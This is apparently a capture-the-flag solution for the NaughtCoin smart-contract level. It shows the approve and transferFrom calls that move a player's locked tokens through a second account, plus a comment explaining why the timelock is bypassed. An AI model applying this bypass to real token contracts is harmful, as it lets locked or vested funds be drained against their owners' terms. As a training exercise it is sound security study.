//tx sent from the player account:
contract.approve("0xaccount2", contract.INITIAL_SUPPLY);

//tx sent from account 2
contract.transferFrom("0xplayer_account", "0xaccount2", contract.INITIAL_SUPPLY);

/*
The allowance to spend the tokens was given to another account so that
this account could withdraw the tokens from the player account's balance.

The NaughtCoin contract suggests that tokens cannot be spent if msg.sender 
is equal to the player account, but tx to spend the token was sent from another account,
so tokens are spent without block.timestamp reaching the timeLock.
*/